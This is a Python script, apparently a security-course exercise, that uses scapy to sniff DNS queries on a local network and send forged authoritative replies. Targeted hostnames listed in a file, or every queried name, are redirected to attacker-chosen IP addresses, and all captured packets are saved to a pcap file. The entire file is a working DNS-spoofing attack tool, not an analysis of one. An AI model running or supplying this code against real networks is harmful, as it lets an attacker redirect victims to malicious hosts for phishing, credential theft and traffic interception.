from scapy.all import *
import netifaces
import argparse

conf.sniff_promisc=1
pkts = []

def getip(iface):
	if iface in netifaces.interfaces():
		return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
			
def spoofcallback(interface,filename):
	def dnsspoof(pkt):
		# print(pkt.show())
		pkts.append(pkt)
		wrpcap("my_dnspoison.pcap", pkts)
		if (pkt.haslayer(DNSQR) and pkt[DNS].qdcount==1 and pkt[DNS].ancount==0): # DNS question record
			print(str(pkt[DNSQR].qname))
			if filename:
				pairs=dict(line.split() for line in open(filename))
				for key, value in pairs.items():
					if key in str(pkt[DNSQR].qname):
						print("==========TARGET OCCUR==========")
						redirect_to = value
						spoofed_pkt = Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/\
						IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
						UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
						DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
						sendp(spoofed_pkt,iface=interface)	
						print('Sent:', spoofed_pkt.show())
						break;
					else:
						print("==========NOT TARGET==========")
			else:
        			redirect_to = getip(interface)
        			spoofed_pkt = Ether()/\
				IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
				DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        			sendp(spoofed_pkt,iface=interface)
        			print('Sent:', spoofed_pkt.show())
	return dnsspoof


parser=argparse.ArgumentParser(add_help=False)
parser.add_argument('-i',help='interface name',required=False)
parser.add_argument('-f',help='hostnames file',required=False)
parser.add_argument('--expression',help='BPF filter expression',required=False)
args=parser.parse_args()

if args.i:
	interface = args.i	
else:
	interface=netifaces.gateways()['default'][netifaces.AF_INET][1]

if args.expression:
	filterexpr='udp port 53 and ' + args.expression
else:
	filterexpr='udp port 53'

print(args)
print("Poisoning starting...")

sniff(filter=filterexpr, iface=interface, store=0, prn=spoofcallback(interface,args.f))